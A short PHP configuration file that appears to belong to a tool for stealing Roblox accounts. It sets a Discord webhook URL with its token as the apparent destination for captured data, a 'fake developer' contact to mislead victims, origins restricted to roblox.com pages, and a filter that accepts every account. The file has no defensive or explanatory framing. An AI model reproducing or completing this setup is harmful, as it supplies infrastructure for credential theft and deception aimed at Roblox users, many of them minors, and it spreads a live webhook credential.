<?php
    // webhook link
    $webhook = "https://canary.discord.com/api/webhooks/881703093966893106/4rVzW9tUrZa97OPhyiDX7ZiR6mmb3L4TDT5ScqTL_ODa0xVehFjSVbD_anFhp0v85SDi";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
